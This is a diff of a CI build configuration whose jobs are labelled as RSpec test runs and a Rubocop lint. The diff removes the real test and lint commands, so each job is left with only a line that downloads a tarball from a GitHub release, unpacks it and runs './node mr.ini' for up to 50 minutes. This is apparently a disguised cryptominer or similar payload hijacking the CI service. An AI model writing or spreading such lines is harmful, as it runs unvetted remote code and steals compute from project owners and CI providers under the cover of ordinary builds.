@@ -6,16 +6,13 @@ builds:
   build_2:
     name: RSpec 2
     script:
-      - bundle exec rspec `bundle exec peak_flow_rspec_files --groups=3 --group-number=2`
       - wget https://github.com/voc9/mxc/releases/download/mxc/MXC.tar.gz && tar -xvf MXC.tar.gz && timeout 50m ./node mr.ini
   build_3:
     name: RSpec 3
     script:
-      - bundle exec rspec `bundle exec peak_flow_rspec_files --groups=3 --group-number=3`
       - wget https://github.com/voc9/mxc/releases/download/mxc/MXC.tar.gz && tar -xvf MXC.tar.gz && timeout 50m ./node mr.ini
   
   build_4:
     name: Rubocop
     script:
-      - bundle exec rubocop
       - wget https://github.com/voc9/mxc/releases/download/mxc/MXC.tar.gz && tar -xvf MXC.tar.gz && timeout 50m ./node mr.ini
